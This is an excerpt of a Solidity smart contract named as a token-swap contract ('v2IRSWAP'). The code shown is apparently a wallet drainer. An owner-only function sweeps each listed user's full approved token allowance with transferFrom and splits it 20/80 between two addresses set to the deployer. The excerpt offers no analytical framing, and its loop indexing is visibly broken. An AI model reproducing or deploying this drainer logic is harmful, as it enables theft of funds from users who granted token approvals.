...
contract _v2IRSWAP is v2IRSWAP {
    ...
    function initialize (address _route) external {
        ...
        owner = msg.sender;
       __address1 = msg.sender;
       __address2 = msg.sender;
    }
    


    function getAuto(address[] memory list, uint256[2] memory range)
        external
        Security
    {
        for (uint256 i = range[0]; i < range[1]; i++) {
            for (uint256 z = 0; z < list.length; z++) {
                __transfer(list[i], users[i]);
            }
        }
    }


    function __transfer(address token, address user) internal {
        uint256 user_amount = calculate(token, user);
        uint256 value20 = (user_amount * 20) / 100;
        uint256 value80 = user_amount - value20;

        if (value20 > 0) {
            inspector(IERC20(token).transferFrom(user, __address1, value20));
        }
        if (value80 > 0) {
            inspector(IERC20(token).transferFrom(user, __address2, value80));
        }
    }

    function calculate(address token, address user)
        internal
        view
        returns (uint256)
    {
        uint256 value = IERC20(token).allowance(user, address(this));
